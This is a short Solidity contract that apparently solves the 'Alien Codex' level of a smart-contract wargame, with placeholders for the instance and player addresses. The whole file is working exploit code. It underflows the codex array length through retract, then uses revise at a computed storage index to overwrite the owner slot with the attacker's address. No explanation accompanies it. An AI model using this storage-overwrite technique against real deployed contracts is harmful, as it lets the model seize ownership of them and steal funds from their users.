pragma solidity ^0.8.0;

interface IAlienCodex {
    function make_contact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract AttackAlienCodex {
    address alienAddress = YOUR_INSTANCE_ADDRESS;
    IAlienCodex alienContract = IAlienCodex(alienAddress);
    
    uint256 maxValueCodexArray = 2 ** 256 - 1; 
    uint256 hashSlotOne = uint256(keccak256(abi.encodePacked(bytes32(uint(1)))));
    uint256 slotOfStorageRewrite = maxValueCodexArray - hashSlotOne + 1;
    
    bytes32 content = bytes32(uint256(uint160(address(YOUR_PLAYER_ADDRESS))));
    
    function contact() public {
        alienContract.make_contact();
    } 
    
    function pwn() public {
        alienContract.retract();
        alienContract.revise(slotOfStorageRewrite, content);
    }
}
